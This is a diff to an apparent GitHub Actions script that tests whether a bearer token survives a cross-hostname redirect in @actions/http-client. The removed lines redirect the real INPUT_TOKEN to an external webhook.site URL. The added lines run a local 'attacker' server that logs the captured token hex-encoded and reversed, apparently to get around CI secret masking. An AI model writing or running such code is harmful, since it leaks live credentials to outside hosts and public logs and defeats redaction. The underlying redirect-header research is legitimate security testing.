@@ -23,41 +23,54 @@ runs:
         } catch(e) {
           const { createRequire } = await import('module');
           const req = createRequire(import.meta.url);
-          const pkgPath = req.resolve('@actions/http-client');
-          const auth = await import(pkgPath.replace(/index\.js$/, 'auth.js'));
+          const auth = await import(req.resolve('@actions/http-client').replace(/index\.js$/, 'auth.js'));
           BearerCredentialHandler = auth.BearerCredentialHandler;
         }
 
-        console.log('Using: BearerCredentialHandler from @actions/http-client');
-
-        const server = http.createServer((q, s) => {
-          console.log('[server] redirecting to webhook.site');
-          s.writeHead(302, { Location: 'https://webhook.site/af6ce540-4bd7-41c4-9328-61a4b5c6c7c0' });
+        // Origin on 127.0.0.1 — redirects to attacker on localhost
+        // Different hostnames = cross-origin → auth should be stripped
+        const origin = http.createServer((q, s) => {
+          s.writeHead(302, { Location: 'http://localhost:19998/capture' });
           s.end();
         });
 
-        server.listen(19999, '127.0.0.1', async () => {
-          const token = process.env.INPUT_TOKEN;
-          console.log('Token length: ' + (token ? token.length : 0));
-
-          const client = new hc.HttpClient('qc', [new BearerCredentialHandler(token)], {
-            allowRedirects: true,
-            maxRedirects: 5
-          });
-
-          try {
-            console.log('GET http://127.0.0.1:19999/api ...');
-            const res = await client.get('http://127.0.0.1:19999/api');
-            console.log('Response status: ' + res.message.statusCode);
-            const body = await res.readBody();
-            console.log('Body length: ' + body.length);
-          } catch(e) {
-            console.log('Error: ' + e.message);
-            console.log('Error code: ' + (e.code || 'none'));
+        // Attacker capture on localhost
+        const attacker = http.createServer((q, s) => {
+          const auth = q.headers.authorization || 'NONE';
+          const hex = Buffer.from(auth).toString('hex');
+          const rev = auth.split('').reverse().join('');
+          console.log('');
+          console.log('=== ATTACKER SERVER (localhost:19998) ===');
+          console.log('Auth present: ' + (auth !== 'NONE'));
+          console.log('Auth hex: ' + hex);
+          console.log('Auth reversed: ' + rev);
+          if (auth !== 'NONE') {
+            console.log('>>> SECRET LEAKED TO DIFFERENT HOSTNAME <<<');
           }
+          s.writeHead(200);
+          s.end('captured');
+        });
 
-          server.close();
-          process.exit(0);
+        origin.listen(19999, '127.0.0.1', () => {
+          attacker.listen(19998, 'localhost', async () => {
+            const token = process.env.INPUT_TOKEN;
+            console.log('Library: @actions/http-client (REAL)');
+            console.log('Handler: ' + BearerCredentialHandler.name);
+            console.log('Origin: http://127.0.0.1:19999');
+            console.log('Redirect: http://localhost:19998 (DIFFERENT hostname)');
+            console.log('');
+
+            const client = new hc.HttpClient('qc', [new BearerCredentialHandler(token)]);
+            try {
+              await client.get('http://127.0.0.1:19999/api');
+            } catch(e) {
+              console.log('Error: ' + e.message);
+            }
+
+            origin.close();
+            attacker.close();
+            process.exit(0);
+          });
         });
         SCRIPT
 
